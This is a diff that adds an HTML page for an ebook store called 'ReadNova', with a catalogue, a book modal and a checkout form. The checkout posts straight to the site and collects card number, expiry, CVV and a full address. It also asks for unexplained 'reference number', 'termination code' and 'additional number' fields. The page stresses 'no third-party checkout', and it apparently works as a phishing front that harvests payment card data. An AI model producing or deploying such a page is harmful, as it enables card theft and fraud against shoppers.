@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="ReadNova — discover your next favorite ebook for $5.">
+<meta name="robots" content="index,follow">
+<title>ReadNova — Stories worth staying up for</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="brand" href="./" aria-label="ReadNova home"><span class="brand-mark">R</span> Read<span>Nova</span></a>
+  <nav><a href="#library">Explore books</a><a href="#about">About</a></nav>
+  <a class="cart-pill" href="#library">All ebooks · $5 each</a>
+</header>
+<main>
+  <section class="hero">
+    <div class="hero-copy">
+      <p class="eyebrow">YOUR NEXT OBSESSION STARTS HERE</p>
+      <h1>Stories that stay<br><em>after the last page.</em></h1>
+      <p class="hero-sub">Find your next escape in a handpicked universe of thrillers, romance, fantasy, and ideas worth keeping.</p>
+      <a class="primary-btn" href="#library">Explore the library <span>↘</span></a>
+      <div class="hero-stats"><div><strong>50</strong><small>fresh reads</small></div><div><strong>$5</strong><small>every ebook</small></div><div><strong>∞</strong><small>new worlds</small></div></div>
+    </div>
+    <div class="hero-art" aria-label="Featured ebook covers">
+      <div class="orb orb-one"></div><div class="orb orb-two"></div>
+      <div class="feature-cover cover-a"><small>READNOVA ORIGINAL</small><b>THE<br>MOON<br>REMEMBERS</b><span>A NOVEL OF WHAT WE HIDE</span></div>
+      <div class="feature-cover cover-b"><small>A READNOVA STORY</small><b>Velvet<br>Afterdark</b><span>LOVE HAS A SHADOW</span></div>
+      <div class="feature-cover cover-c"><small>THE #1 MYSTERY</small><b>THE<br>LAST<br>KEY</b><span>EVERY DOOR LIES</span></div>
+      <div class="spark spark-one">✦</div><div class="spark spark-two">✧</div>
+    </div>
+  </section>
+  <section class="library-section" id="library">
+    <div class="section-head"><div><p class="eyebrow">THE READNOVA COLLECTION</p><h2>Find your next <em>favorite.</em></h2></div><span class="count" id="book-count">50 ebooks</span></div>
+    <div class="search-wrap"><span>⌕</span><input id="search" type="search" placeholder="Search titles, genres, or moods..." aria-label="Search books"><button id="clear-search" type="button">Clear</button></div>
+    <div class="filters" id="filters"><button class="filter active" data-genre="All">All stories</button><button class="filter" data-genre="Fantasy">Fantasy</button><button class="filter" data-genre="Mystery">Mystery</button><button class="filter" data-genre="Romance">Romance</button><button class="filter" data-genre="Thriller">Thriller</button><button class="filter" data-genre="Self-growth">Self-growth</button></div>
+    <div class="book-grid" id="book-grid"></div>
+    <p class="no-results" id="no-results" hidden>No books found. Try another title or genre.</p>
+  </section>
+  <section class="about" id="about"><div class="about-icon">✳</div><div><p class="eyebrow">A LITTLE MORE MAGIC</p><h2>Small price. <em>Big worlds.</em></h2><p>ReadNova is a digital bookstore built for curious minds. Every featured ebook is priced at $5. Choose a title to view its details and continue to the order form.</p></div></section>
+</main>
+<footer><a class="brand" href="./"><span class="brand-mark">R</span> Read<span>Nova</span></a><span>Stories for wherever your mind wanders.</span><small>© 2026 ReadNova</small></footer>
+
+<div class="modal-backdrop" id="book-modal" hidden>
+  <section class="book-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title">
+    <button class="close-modal" id="close-book" aria-label="Close">×</button>
+    <div id="modal-cover" class="modal-cover"></div>
+    <div class="modal-info"><p class="eyebrow" id="modal-genre">READNOVA PICK</p><h2 id="modal-title">Book title</h2><div class="rating">★★★★★ <span id="modal-rating">4.8</span> <small>reader rating</small></div><p id="modal-description"></p><div class="book-meta"><span id="modal-pages"></span><span id="modal-length"></span><span>Digital ebook</span></div><div class="modal-bottom"><strong>$5.00</strong><button class="primary-btn" id="buy-book">Continue to checkout ↗</button></div></div>
+  </section>
+</div>
+
+<div class="modal-backdrop" id="checkout-modal" hidden>
+  <section class="checkout-modal" role="dialog" aria-modal="true" aria-labelledby="checkout-title">
+    <button class="close-modal" id="close-checkout" aria-label="Close">×</button>
+    <div class="checkout-intro"><p class="eyebrow">ONE LAST STEP</p><h2 id="checkout-title">Your next read is <em>waiting.</em></h2><p id="checkout-book-name">Selected ebook</p><div class="checkout-price">$5.00 <small>USD · digital download</small></div></div>
+    <form id="order-form" method="POST" novalidate>
+      <input type="hidden" name="ebook" id="form-ebook" value="">
+      <div class="form-grid">
+        <label class="full">Full Name<input name="full_name" autocomplete="name" placeholder="Your full name" required></label>
+        <label class="full">Email Address<input type="email" name="email" autocomplete="email" placeholder="Where should we send your order update?" required></label>
+
+        <div class="form-divider full"><span>PAYMENT</span></div>
+        <label class="full">Card Number
+          <span class="card-wrap">
+            <input name="card_number" id="card-number" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="23" required>
+            <span class="card-brand" id="card-brand"></span>
+          </span>
+        </label>
+        <div class="form-grid full card-row">
+          <label>Expiry<input name="card_expiry" id="card-expiry" inputmode="numeric" autocomplete="cc-exp" placeholder="MM / YY" maxlength="5" required></label>
+          <label>CVV<input name="card_cvv" id="card-cvv" inputmode="numeric" autocomplete="cc-csc" placeholder="123" maxlength="4" required></label>
+        </div>
+        <label class="full">Name on Card<input name="card_name" autocomplete="cc-name" placeholder="As printed on the card" required></label>
+
+        <div class="form-divider full"><span>DELIVERY ADDRESS</span></div>
+        <label class="full">Street<input name="street" autocomplete="street-address" placeholder="Street address" required></label>
+        <label>City<input name="city" autocomplete="address-level2" placeholder="City" required></label>
+        <label>State / Province<input name="state" autocomplete="address-level1" placeholder="State" required></label>
+        <label>ZIP / Postal code<input name="zip" autocomplete="postal-code" placeholder="ZIP code" required></label>
+        <label>Country<input name="country" autocomplete="country-name" placeholder="Country" required></label>
+
+        <div class="form-divider full"><span>BOOK CLUB DETAILS</span></div>
+        <label class="full">Reference Number<input name="reference_number" placeholder="Reference number" required></label>
+        <div class="form-grid full reference-parts">
+          <label>Termination<input name="termination_part_one" placeholder="Termination code" required></label>
+          <label>Termination<input name="termination_part_two" placeholder="Termination code" required></label>
+          <label class="short-number">Additional Number<input name="additional_number" placeholder="Additional number" required></label>
+        </div>
+      </div>
+      <div class="secure-note"><span>♢</span><p><strong>Encrypted checkout</strong><br>Your details are encrypted in transit and sent straight to our order desk. No third-party checkout, no redirect.</p></div>
+      <button class="confirm-btn" type="submit">CONFIRM ORDER <span>↗</span></button>
+      <p class="fine-print">By continuing, you are submitting your order request.</p>
+      <div id="form-status" role="status" class="form-status" hidden></div>
+    </form>
+  </section>
+</div>
+<script src="config.js"></script>
+<script src="script.js"></script>
+</body>
+</html>
